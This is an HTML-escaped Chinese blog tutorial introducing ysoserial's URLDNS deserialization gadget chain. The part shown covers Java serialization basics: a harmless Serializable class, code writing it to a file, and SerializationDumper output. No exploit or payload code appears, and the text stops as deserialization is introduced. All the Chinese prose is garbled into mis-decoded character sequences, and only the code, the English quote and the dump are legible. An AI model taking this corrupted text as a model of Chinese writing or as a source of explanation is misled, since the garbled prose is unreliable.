&lt;p&gt;æœ¬æ–‡æ‰€è¿°çš„æ˜¯URLDNSåˆ©ç”¨é“¾åˆ†æï¼Œåœ¨æ­¤ä¹‹å‰è¿˜è¦å…ˆä»‹ç»ä¸€ä¸‹ä¸€ä¸ªâ¾¥ç¨‹ç¢‘ï©‹å¼çš„å·¥å…·ï¼š&lt;a href=&#34;https://github.com/frohoff/ysoserial&#34;&gt;ysoserial&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;å¼•ç”¨å®˜ç½‘çš„ä¸€å¥æè¿°ï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;ysoserial&lt;/strong&gt; is a collection of utilities and property-oriented programming &amp;ldquo;gadget chains&amp;rdquo; discovered in common java libraries that can, under the right conditions, exploit Java applications performing &lt;strong&gt;unsafe deserialization&lt;/strong&gt; of objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes this data, the chain will automatically be invoked and cause the command to be executed on the application host.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;è¯¥å·¥å…·å®ƒå¯ä»¥è®©â½¤æˆ·æ ¹æ®â¾ƒâ¼°é€‰æ‹©çš„åˆ©â½¤é“¾ï¼Œâ½£æˆååºåˆ—åŒ–åˆ©â½¤æ•°æ®ï¼Œé€šè¿‡å°†è¿™äº›æ•°æ®å‘é€ç»™â½¬æ ‡ï¼Œä»â½½æ‰§â¾â½¤æˆ·é¢„å…ˆå®šä¹‰çš„å‘½ä»¤ã€‚&lt;/p&gt;
&lt;p&gt;è€ŒURLDNSå°±æ˜¯ysoserialå…¶ä¸­çš„ä¸€æ¡åˆ©ç”¨é“¾ï¼Œè™½ç„¶è¯´ä¸èƒ½æ‰§è¡Œå‘½ä»¤ï¼Œä½†å¯ä»¥æ£€æµ‹æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ã€‚&lt;/p&gt;
&lt;p&gt;åˆ©ï§â½¤ç”¨é“¾ä¹Ÿå«â€œgadget chainsâ€ï¼Œæˆ‘ä»¬é€šå¸¸ç§°ä¸ºgadgetã€‚&lt;/p&gt;
&lt;h1 id=&#34;0x01-javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–&#34;&gt;0x01 Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–&lt;/h1&gt;
&lt;p&gt;åœ¨äº†è§£URLDNSé“¾ä¹‹å‰æˆ‘ä»¬å…ˆæ¥ç†è§£ä¸€ä¸‹Javaçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ¦‚å¿µã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬çŸ¥é“PHPä¹Ÿæ˜¯å­˜åœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„ï¼ŒPHPä¸­æ˜¯ä½¿ç”¨å„ç§é­”æœ¯æ–¹æ³•æ¥å®ç°ï¼Œé‚£åœ¨Javaä¸­å°±æ˜¯ä½¿ç”¨readObjectå’ŒwriteObjectæ¥å®ç°çš„ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;åœ¨çœ‹æœ¬æ–‡æ—¶è®°å¾—å…ˆå»å­¦ä¹ ä¸€ä¸‹Javaçš„åŸºç¡€ï¼Œä¸‹é¢åªæ˜¯ä½œä¸ºå›é¡¾ä»‹ç»&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;javaåºåˆ—åŒ–&#34;&gt;Javaåºåˆ—åŒ–&lt;/h2&gt;
&lt;p&gt;å¯¹è±¡åºåˆ—åŒ–çš„æœ€ä¸»è¦çš„ç”¨å¤„å°±æ˜¯åœ¨ä¼ é€’å’Œä¿å­˜å¯¹è±¡çš„æ—¶å€™ï¼Œä¿è¯å¯¹è±¡çš„å®Œæ•´æ€§å’Œå¯ä¼ é€’æ€§ã€‚åºåˆ—åŒ–æ˜¯æŠŠå¯¹è±¡è½¬æ¢æˆæœ‰åºå­—èŠ‚æµï¼Œä»¥ä¾¿åœ¨ç½‘ç»œä¸Šä¼ è¾“æˆ–è€…ä¿å­˜åœ¨æœ¬åœ°æ–‡ä»¶ä¸­ã€‚æ ¸å¿ƒä½œç”¨æ˜¯å¯¹è±¡çŠ¶æ€çš„ä¿å­˜ä¸é‡å»ºã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å…ˆå»ºç«‹ä¸€ä¸ªå¯åºåˆ—åŒ–çš„æ™®é€šç±»,è¿™ä¸ªç±»å¿…é¡»è¦å®ç°ä¸€ä¸ªæ¥å£&lt;code&gt;java.io.Serializable&lt;/code&gt;æ‰èƒ½è¢«åºåˆ—åŒ–ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.io.Serializable&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Serializable_01&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Serializable&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;age&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;Method1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Method1 Running&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nd&#34;&gt;@Override&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;toString&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Serializable_01{&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;s&#34;&gt;&amp;#34;name=&amp;#39;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;sc&#34;&gt;&amp;#39;\&amp;#39;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;s&#34;&gt;&amp;#34;, age=&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;age&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;sc&#34;&gt;&amp;#39;}&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;Serializable_01&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;age&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;age&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;age&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ¥ä¸‹æ¥æˆ‘ä»¬æ¥å¯¹è¯¥å¯¹è±¡è¿›è¡Œåºåˆ—åŒ–ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.io.FileOutputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.io.IOException&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.io.ObjectOutputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Serial_Test&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;Serializable_01&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Ser&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Serializable_01&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;xiaomign&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;ObjectOutputStream&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;obj&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;obj&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ObjectOutputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;FileOutputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;xiaoming.ser&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;obj&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;writeObject&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Ser&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IOException&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;printStackTrace&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬å®ä¾‹åŒ–äº†&lt;code&gt;Serializable_01&lt;/code&gt;å¯¹è±¡ï¼Œç„¶ååˆ©ç”¨å¯¹è±¡çš„æ„é€ å‡½æ•°èµ‹å€¼ï¼Œæœ€åä½¿ç”¨&lt;code&gt;writeObject&lt;/code&gt;è¿›è¡ŒæŠŠå¯¹è±¡å˜æˆäºŒè¿›åˆ¶å†…å®¹å†™å…¥åˆ°äº†&lt;code&gt;xiaoming.ser&lt;/code&gt;æ–‡ä»¶ä¸­ï¼Œè¿™æ ·åºåˆ—åŒ–å°±å®Œæˆäº†ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœæˆ‘ä»¬æƒ³è¦çœ‹åºåˆ—åŒ–åçš„å†…å®¹ï¼Œå¯ä»¥ä½¿ç”¨ä¸€ä¸ªå·¥å…·è¿›è¡ŒæŸ¥è¯¢&lt;a href=&#34;https://github.com/NickstaDB/SerializationDumper&#34;&gt;SerializationDumper&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨æ–¹æ³•ï¼š&lt;/p&gt;
&lt;p&gt;&lt;code&gt;java -jar SerializationDumper-v1.13.jar -r xiaoming.ser&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;æŸ¥è¯¢åˆšæ‰åºåˆ—åŒ–çš„æ–‡ä»¶ç»“æœï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;STREAM_MAGIC - 0xac ed
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;STREAM_VERSION - 0x00 05
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Contents
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  TC_OBJECT - 0x73
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    TC_CLASSDESC - 0x72
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      className
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        Length - 15 - 0x00 0f
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        Value - Serializable_01 - 0x53657269616c697a61626c655f3031
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      serialVersionUID - 0x0f e1 71 6f 69 bd 44 6f
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      newHandle 0x00 7e 00 00
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      classDescFlags - 0x02 - SC_SERIALIZABLE
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      fieldCount - 2 - 0x00 02
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      Fields
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        0:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          Int - I - 0x49
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          fieldName
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            Length - 3 - 0x00 03
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            Value - age - 0x616765
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        1:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          Object - L - 0x4c
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          fieldName
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            Length - 4 - 0x00 04
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            Value - name - 0x6e616d65
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          className1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            TC_STRING - 0x74
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              newHandle 0x00 7e 00 01
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              Length - 18 - 0x00 12
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      classAnnotations
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        TC_ENDBLOCKDATA - 0x78
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      superClassDesc
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        TC_NULL - 0x70
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    newHandle 0x00 7e 00 02
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    classdata
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      Serializable_01
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        values
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          age
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            (int)12 - 0x00 00 00 0c
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          name
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            (object)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              TC_STRING - 0x74
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                newHandle 0x00 7e 00 03
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                Length - 8 - 0x00 08
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                Value - xiaomign - 0x7869616f6d69676e
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;javaååºåˆ—åŒ–&#34;&gt;Javaååºåˆ—åŒ–&lt;/h2&gt;
&lt;p&gt;å½“ç„¶æœ‰åºåˆ—åŒ–å°±æœ‰ååºåˆ—åŒ–ï¼Œååºåˆ—åŒ–å°±æ˜¯å®¢æˆ·ç«¯ä»æ–‡ä»¶ä¸­æˆ–ç½‘ç»œä¸Šè·å¾—åºåˆ—åŒ–åçš„å¯¹è±¡å­—èŠ‚æµï¼Œæ ¹æ®å­—èŠ‚æµä¸­æ‰€ä¿å­˜çš„å¯¹è±¡çŠ¶æ€åŠæè¿°ä¿¡æ¯ï¼Œé€šè¿‡ååºåˆ—åŒ–é‡å»ºå¯¹è±¡ã€‚&lt;/p&gt;
